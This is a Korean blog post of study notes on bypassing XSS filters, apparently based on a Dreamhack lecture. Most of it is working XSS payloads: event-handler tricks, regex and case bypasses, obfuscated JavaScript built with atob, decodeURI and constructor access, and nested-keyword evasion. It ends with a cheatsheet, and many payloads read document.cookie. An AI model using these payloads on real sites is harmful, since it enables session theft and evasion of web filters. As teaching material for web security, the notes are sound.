---
title: "XSS Filtering Bypass"
date: 2022-03-11 +0900
author: J0ngBae
categories: [Hacking, Web]
tags: ['web', 'xss', 'client side attack', '2022']
---


## XSS 방어 방법
> XSS 방어에는 다양한 방법이 존재한다.<br>가장 확실한 방법은 사용자가 HTML 태그나 엔티티 자체를 입력하지 못하도록 하고, 대신 입력을 서식 없는 평문으로 취급을 하는 것이다.
{: .prompt-tip }

- `<`, `>`, `&` 와 같은 특수 문자들을 Escape
- 클라이언트 측에서 DOM의 `textContent` 또는 `createTextNode` 를 사용해 HTML 태그 등이 해석되는 것을 방지

## 태그 및 속성 필터링

---


> 코드를 실행할 수 있는 HTML 요소는 `<script>` 이외에도 상당수 존재함. 스크립트를 포함할 수 있는 속성이 존재한다.
대표적으로 이벤트 핸들러를 지정하는 `on` 으로 시작하는 속성들이 있다.
{: .prompt-tip }
 
> <https://developer.mozilla.org/ko/docs/Web/Events> 

### onload 속성

- 해당 태그가 요청하는 데이터 로드 후 실행 (로드 실패 시 실행되지 않음).
    
    ```html
    <img src="valid.jpg" onload="alert(document.domain)">
    ```
    
    ```html
    <img src="about:invalid" onload="alert(document.domain)">
    ```
    

### onerror 속성

- 해당 태그가 요청하는 데이터 로드 실패 시 실행 (로드 성공 시 실행되지 않음).
    
    ```html
    <img src="about:invalid" onerror="alert(document.domain)">
    ```
    

### onfocus 속성

- input 태그에 포커스가 되면 실행되는 이벤트 핸들러.
    - autofocus 옵션을 통해 자동으로 포커스를 시키거나, URL의 hash 부분에 input id를 입력하면 포커스 되도록 하여 이벤트 핸들러가 실행되도록 함.
    
    ```html
    <input type="text" id="inputID" onfocus="alert(document.domain)" autofocus>
    ```
    

## 필터링 우회

- 대문자 혹은 소문자만을 인식하는 필터 우회
    
    `x => !x.includes('script') && !x.includes('On')`
    
    ```html
    <ScRiPt>alert(document.cookie)</scriPT>
    <img src=x: oneRroR=alert(document.cookie) />
    ```
    

- 잘못된 정규 표현식을 사용한 필터 우회
    - 스크립트 태그 내에 데이터가 존재하는지 확인하는 필터링
        - `x => !/<script[^>]*>[^<]/i.test(x)`
        
        ```html
        <sCrIpt src=data:, alert(document.cooki)></SCRipt>
        ```
        
        - `x => !/<script[^>]*>[^<]/i.test(x) && !x.includes('document')`
        
        ```html
        <sCrIpt src=data:;base64,YWxlcnQgKGRvY3VtZW50LmNvb2tpZSk7></SCRipt>
        ```
        
        - `x => !/<img[^>]*onerror/i.test(x)`
        
        ```html
        <<img src=> onerror=alert(document.cookie)>
        <img src='>' onerror=alert(document.cookie)//\>
        ```
        
        - `x => !/<img([^>]|['"][^'"]*['"])+onerror/i.test(x)`
        
        ```html
        <img src=">'>" onerror=alert(document.cookie) />
        ```
        
        - `x => !/<img.*on/i.test(x)`
        
        ```html
        <img src=""
        onerror = alert(document.cookie) />
        ```
        

- 특정 태그 및 속성에 대한 필터링을 다른 태그 및 속성을 이용하여 필터 우회
    
    ```html
    <video><source onerror=alert(document.cookie) /></video>
    <body onload=alert(document.cookie) />
    <iframe src=jaVaSCRipt:alert(parent.document.cookie) />
    <iframe srcdoc="<img src='' one&#114;&#114;or=alert(parent.document.cookie)>" />
    ```
    

## JavaScript 함수 및 키워드 필터링

> JavaScript는 Unicode escape sequence, Computed member access 등 코드를 난독화할 수 있는 다양한 기능들을 포함하여 필터를 우회할 수 있다.<br>`atob` 와 `decodeURI` 함수는 각각 Base64 및 URI로 인코딩된 데이터를 디코딩하는 함수로써 키워드 등을 부호화하여 필터를 우회할 수 있다.
{: .prompt-tip }

**Unicode escape sequence**
: 문자열에서 유니코드 문자를 코드포인트로 나타낼 수 있는 표기(ex. `”\uAC00”` = “가”)

**computed member access**
: 객체의 특정 속성을 접근할 때 속성 이름을 동적으로 계산함.

- Unicode escape sequence
    
    ```jsx
    x => typeof x === 'string' && !x.includes('alert') && !x.includes('window') && !x.includes('document')
    
    --> this['al'+'ert']((({'\u0063ookie':x})=>x)(self['\x64ocument']))
        --> this.alert((({cookie: x}) => x)(self.document)
        --> window.alert(self.document.cookie)
        --> alert(document.cookie)
    ```
<br>
- computed member access
    
    ```jsx
    x => typeof x === 'string' && !x.includes('eval') && !x.includes('cookie')
    --> isNaN['construct'+'or'](atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))()
        --> isNaN['constr'+'uctor']("alert(document.cookie)")()
        --> Function("alert(document.cookie)")()
        --> alert(document.cookie)
    --> self['constru'+'ctor']['con'+'structor'](decodeURI("%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65"))
        --> self['constru'+'ctor']['con'+'structor']("alert(document.cookie)")()
        --> self.constructor.constructor("alert(document.cookie)")()
        --> Window.constructor("alert(document.cookie)")()
        --> Function("alert(document.cookie)")()
        --> alert(document.cookie)
    ```
<br>

| 구문 | 대체구문 |
| :--- | :--- |
| alert, XMLHttpRequest 등 최상위 객체 및 함수 | window['al'+'ert'], window['XMLHtt'+'pRequest'] 등 이름 끊어서 쓰기 |
| window | `self`, `this`<br>(”use strict” 가 비활성화되어 있고 this가 명시된 메소드 호출이 아니라는 가정 하) |
| eval(code) | Function(code)() |
| Function | isNaN['constr'+'uctor'] 등 함수의 constructor 속성 접근 |

- 극단적인 사례로 JavaScript의 언어적 특성을 활용하면 6개의 문자 `[`, `]`, `(`, `)`, `!`, `+` 만으로 모든 동작을 수행할 수 있다.

### 문자열 선언

- 일반적인 방법: quotes(`”`, `'`) 또는 Template literals 사용
    
    ```jsx
    var foo = "Hello";
    var bar = "World";
    var baz = `${foo},
    World ${1+1} `; // "Hello,\nWorld 2 "
    ```
    _Template literals은 backtick을 통해 선언하며 멀티라인 문자열도 선언할 수 있다. 또한 내장된 표현식을 통해 다른 변수 또는 식을 사용할 수 있다._
    
- quotes 또는 Template literals을 사용하지 못하는 경우
    - RegExp Object의 pattern 부분을 이용.
        
        ```jsx
        var foo = /Hello World!/.source; // "Hello World!"
        var foo2 = /test !/ + []; // "/test !/"
        ```
        _/test/ 의 Object:  /test/.constructor === RegExp_
        
    - String.fromCharCode 함수는 유니코드의 범위 중 해당 수에 해당하는 문자를 반환.
        
        ```jsx
        var bar = String.fromCharCode(72, 101, 108, 108, 111); // Hello
        ```
        
    - 기본 내장 함수 또는 오브젝트의 문자를 사용하는 방법.
        - history.toString(); ⇒ “[object History]”
        - URL.toString(); ⇒ “function URL() { [native code] }”
        
        ```jsx
        var baz = history.toString()[8] + // "H"
        (history+[])[9] + // "i"
        (URL+0)[12] + // "("
        (URL+0)[13]; // ")" ==> "Hi()"
        ```
        _history+[]; history+0; ⇒ 연산을 위해 history 오브젝트에서 toString() 함수가 실행된다._
        
    - E4X operator(”..”) 연산자를 이요앟여 number 오브젝트에 접근.
        - 숫자 속성에 접근 시, 앞에 공백을 한 칸 추가해 점이 소수점으로 인식되지 않도록 하는 방법도 있음.
        
        ```jsx
        var qux = 29234652..toString(36); // "hello"
        var qux2 = 29234652 .toString(36); // "hello"
        ```
        _parseInt(”hello”, 36); ⇒ 29234652_
        

### 함수 호출

- 일반적인 방법
    
    괄호 또는 Tagged templates 사용
    
    ```jsx
    alert(1);
    alert`1`;
    ```
    

- 괄호 또는 Tagged templates를 사용하지 못하는 경우
    - javascript scheme을 통해 함수 실행
        
        ```jsx
        location="javascript:alert\x281\x29;";
        location.href="javascript:alert\u00281\u0029;";
        location['href']="javascript:alert\0501\051;";
        ```
        
    - instanceof 연산자를 이용한 함수 실행
        - JavaScript에서는 문자열 이외에도 ECMAScript 6에서 추가된 Symbol 또한 속성 명칭으로 사용할 수 있다.
        - Symbol.hasInstance well-known symbol을 이용하면 instanceof 연산자를 override할 수 있다.
        - 즉, (O instanceof C)를 연산할 때 C에 Symbol.hasInstance 속성에 함수가 있을 경우 메소드로 호출하여 instanceof 연산자의 결과값으로 사용하게 된다.
        
        ```jsx
        	"alert\x281\x29"instanceof{[Symbol.hasInstance]:eval};
        	Array.prototype[Symbol.hasInstance]=eval;"alert\x281\x29"instanceof[];
        ```
        
    - document에 새로운 html 추가를 통해 자바스크립트 실행.
        
        ```jsx
        document.body.innerHTML+="<img src=x: onerror=alert&#40;1&#41;>";
        ```
        

- 기타
    - 속성 참조
        
        ```jsx
        alert['toString'] === alert.toString; // true
        ```
        
    - unicode를 이용하여 문자열 우회
        
        ```jsx
        \u0061lert == \u{61}lert; // alert
        ```
        
- Cheatsheet
    
    ```jsx
    this['al'+'ert'](this['docu'+'ment']['coo'+'kie']);
    
    Boolean[decodeURI('%63%6F%6E%73%74%72%75%63%74%6F%72')](
          decodeURI('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))();
    Boolean[atob('Y29uc3RydWN0b3I')](atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ'))();
    
    /alert/.source+[URL+[]][0][12]+/document.cookie/.source+[URL+[]][0][13] instanceof{[Symbol.hasInstance]:eval};
    location=/javascript:/.source + /alert/.source + [URL+0][0][12] + /document.cookie/.source + [URL+0][0][13];
    ```
    
<br>
### 문자열 치환

> 의심되는 XSS구문을 거부하는 대신 단순히 치환 또는 제거하는 관습이 존재함.<br>이는 필터되는 문자열 사이에 또 다른 필터되는 문자열을 넣으면 최종적으로 바깥에 필터링되는 문자열이 다시 나타나게 되어 필터가 무력화될 뿐더러 웹 응용 방화벽 등에서 탐지하지 못하게되는 부작용이 발생.
{: .prompt-tip }

```jsx
(x => x.replace(/script/g, ''))('<scrscriptipt>alscriptert(documescriptnt.cooscriptkie)</scrscriptipt>')
--> <script>alert(document.cookie)</script>
(x => x.replace(/onerror/g, ''))('<img oneonerrorrror=promonerrorpt(1)>')
--> <img onerror=prompt(1) />
```
<br>
> 대안 접근 방식으로 흔히 다음과 같이 문자열에 변화가 없을 때까지 지속적으로 치환하는 방식이 사용되곤 한다.<br>
특정 키워드가 최종 마크업에 등장하지 않도록 하는 데에는 효과적일 수 있지만 미처 고려하지 못한 구문의 존재, WAF 방어 무력화 등은 동일하다는 점을 기억해야 합니다.
{: .prompt-tip }

```jsx
function replaceIterate(text) {
    while (true) {
        var newText = text
            .replace(/script|onerror/gi, '');
        if (newText === text) break;
        text = newText;
    }
    return text;
}
replaceIterate('<imgonerror src="data:image/svg+scronerroriptxml,&lt;svg&gt;" onloadonerror="alert(1)" />')
--> <img src="data:image/svg+xml,&lt;svg&gt;" onload="alert(1)" />
replaceIterate('<ifronerrorame srcdoc="&lt;sonerrorcript&gt;parent.alescronerroriptrt(1)&lt;/scrionerrorpt&gt;" />')
--> <iframe srcdoc="&lt;script&gt;parent.alert(1)&lt;/script&gt;" />
```

## 활성 하이퍼링크

> HTML 마크업에서 사용될 수 있는 URL들은 활성 콘텐츠를 포함할 수 있습니다. 이 중 `javascript:` 스키마는 URL 로드 시 자바스크립트 코드를 실행할 수 있도록 합니다. 브라우저들은 또한 URL를 사용할 때 정규화(normalization)를 거치는데, 이 과정에서 `\x01`, `\x04` 와 같은 특수 제어 문자들이 제거될 수 있습니다. HTML 요소 속성에서 엔티티를 사용할 수 있다는 점을 이용하면 다양한 우회 기법을 사용할 수 있게 됩니다.
{: .prompt-tip }

## Reference
> Dreamhack - <https://dreamhack.io/lecture/courses/318> 